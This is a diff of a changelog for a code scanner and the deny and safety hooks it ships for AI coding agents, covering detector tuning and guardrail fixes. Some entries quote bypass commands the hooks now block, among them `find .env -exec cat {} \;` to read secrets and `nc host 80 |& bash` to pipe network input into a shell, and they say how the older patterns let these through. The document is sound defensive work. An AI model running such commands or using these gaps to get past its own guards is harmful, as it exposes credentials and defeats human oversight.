@@ -5,7 +5,7 @@
 - **Concatenated commands stay dynamic** - `const command = "echo " + input` keeps process-exec at warning when the shell is enabled.
 - **Comments above decorators count as documentation** - a comment over `@Post(...)` documents the method, as does one above a split-line signature.
 - **Aliased sole-class exports match their file** - `export { Foo as Bar }` in `bar.ts` no longer draws a class/file mismatch.
-- **Lockfiles leave sensitive-data scans** - package-manager lockfiles no longer emit secret findings; source files still use error severity.
+- **Lockfiles drop only the entropy detector** - integrity digests stop reporting; a credential in a `resolved` URL still reports at error severity.
 - **Baseline impact** - NodeGoat entropy findings drop 1,292→0 and nodejs-goof 833→1; zod stays 47 and juice-shop 97.
 - **Known scoring limitation** - composite scores remain volume-sensitive: vulnerable nodejs-goof scores 80.4 (B), NodeGoat 52.2 and clean zod 18.8.
 - **Short variables skip local callable parameters** - module-local arrows and test callbacks are exempt; exported bindings stay covered.
@@ -18,10 +18,13 @@
 - **Claude agent surface synced to goat-flow 1.15.1** - deny and Stop hooks route through `run-with-bash.mjs`. (`.claude/settings.json`)
 - **Copilot agent surface lifted from goat-flow 1.12.1 to 1.15.1** - skill pack and deny hook match Claude's. (`.github/hooks/hooks.json`)
 - **Codex runs the post-turn safety scan** - goat-flow 1.15.1 registers a Stop hook beside the Bash deny hook. (`.codex/hooks.json`)
-- **`.env.example` is editable again** - the blanket `Edit(**/.env*)` deny is gone; real env variants stay denied. (`.claude/settings.json`)
+- **`.env.example` is editable again** - a deny rule cannot carry an exception, so the blanket `**/.env*` deny is replaced by named variants. (`.claude/settings.json`)
+  - Covers `.env`, `.envrc`, the standard environment names, `.env.*.local`, and `backup`/`bak`/`old`/`orig`/`save`/`prod`/`dev`/`secret(s)` copies.
+  - A name outside that list stays readable by the Read tool; the Bash deny hook still blocks shell access to every `.env*` name.
 - **Hook coverage evidence expires** - re-run `goat-flow hooks verify . --agent <id> --scenario <name>` or the audit reports coverage unverified.
 - **Nested find actions no longer mask the outer command** - `find .env -exec cat {} \;` reached the secret guard as `cat {}` and was allowed; the shared segment context is restored after each nested walk. (`.goat-flow/hooks/deny-dangerous/patterns-shell.sh`)
-- **Guardrail hooks deliberately diverge from the goat-flow 1.15.1 template** - the two fixes above are not in the upstream template yet, so `audit --agent <id>` reports `agent-guardrails` as differing and `install`/`hooks sync` would revert them. Re-apply after any goat-flow upgrade.
+- **`|&` pipelines reach the same guards as `|`** - `nc host 80 |& bash` was allowed because the stage read as `& bash`. (`.goat-flow/hooks/deny-dangerous/patterns-shell.sh`)
+- **Guardrail hooks deliberately diverge from the goat-flow 1.15.1 template** - the three fixes above are not in the upstream template yet, so `audit --agent <id>` reports `agent-guardrails` as differing and `install`/`hooks sync` would revert them. Re-apply after any goat-flow upgrade.
 - **`secrets` counts as a path, not a word** - `npm run secrets` and `ls secrets` work again, while `secrets/api.key`, `./secrets`, and `~/secrets` stay blocked. (`.goat-flow/hooks/deny-dangerous/patterns-paths.sh`)
 - **CI reads the guardrails it ships** - a hooks job runs shellcheck plus the deny-dangerous and post-turn-safety self-tests, which the Node matrix and the self-scan both skip. (`.github/workflows/ci.yml`)
 - **Preflight lints and exercises the hooks** - shellcheck covers `.goat-flow/hooks`, and a safety hook policy step runs both hook self-tests locally. (`scripts/preflight-checks.sh`)
